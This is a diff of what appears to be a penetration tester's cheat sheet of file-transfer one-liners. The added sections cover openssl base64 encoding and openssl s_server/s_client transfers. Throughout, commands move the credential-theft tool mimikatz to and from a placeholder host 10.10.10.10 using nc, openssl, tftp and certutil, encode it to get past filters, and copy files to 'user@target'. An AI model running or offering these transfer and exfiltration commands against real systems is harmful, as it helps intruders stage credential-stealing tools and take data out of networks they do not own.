@@ -110,6 +110,7 @@ Links:
 
 https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin
 
+
 ## scp / pscp.exe
 
 `pscp.exe C:\Users\Public\info.txt user@target:/tmp/info.txt`
@@ -133,6 +134,13 @@ Links:
 https://twitter.com/egre55/status/1087685529016193025
 
 
+## base64
+
+`cat binary | base64 -w 0`
+
+`echo <base64> | base64 -d > binary`
+
+
 ## certutil.exe base64
 
 `certutil.exe -encode mimikatz.exe mimikatz.txt`
@@ -140,11 +148,11 @@ https://twitter.com/egre55/status/1087685529016193025
 `certutil.exe -decode mimikatz.txt mimikatz.exe`
 
 
-## base64
+## openssl base64
 
-`cat binary | base64 -w 0`
+`openssl.exe enc -base64 -in mimikatz.exe -out mimikatz.txt`
 
-`echo <base64> | base64 -d > binary`
+`openssl.exe enc -base64 -d -in mimikatz.txt -out mimikatz.exe`
 
 
 ## WebDAV downloaders
@@ -184,6 +192,15 @@ https://github.com/api0cradle/LOLBAS/blob/master/LOLBins.md
 `nc -nv 10.10.10.10 8000 </tmp/mimikatz.exe`
 
 
+## openssl
+
+`openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem`
+
+`openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/mimikatz.exe`
+
+`openssl s_client -connect 10.10.10.10:80 -quiet > mimikatz.exe`
+
+
 ## web browser / server
 
 `python -m SimpleHTTPServer 80`
@@ -200,6 +217,7 @@ https://github.com/api0cradle/LOLBAS/blob/master/LOLBins.md
 ## wget
 
 `wget http://10.10.10.10:80/info.txt -O /tmp/info.txt`
+
 
 ## cscript wget.js
 
@@ -223,6 +241,7 @@ BinStream.SaveToFile("out.bin");
 Links:
 
 https://superuser.com/questions/25538/how-to-download-files-from-command-line-in-windows-like-wget-or-curl
+
 
 ## cscript wget.vbs
 
@@ -251,6 +270,7 @@ Links:
 
 https://staheri.com/my-blog/2013/january/vbscript-download-file-from-url/
 
+
 ## curl
 
 `curl -o /tmp/info.txt http://10.10.10.10:80/info.txt`
@@ -259,6 +279,7 @@ https://staheri.com/my-blog/2013/january/vbscript-download-file-from-url/
 ## rdesktop
 
 `rdesktop 10.10.10.10 -r disk:linux='/home/user/rdesktop/files'`
+
 
 ## smb
 
@@ -271,6 +292,7 @@ https://staheri.com/my-blog/2013/january/vbscript-download-file-from-url/
 `pushd \\10.10.10.10\share`
 
 `mklink /D share \\10.10.10.10\share`
+
 
 ## ftp
 
@@ -289,9 +311,11 @@ Links:
 
 https://www.jscape.com/blog/using-windows-ftp-scripts-to-automate-file-transfers
 
+
 ## tftp
 
 `tftp -i 10.10.10.10 get mimikatz.exe`
+
 
 ## debug.exe
 
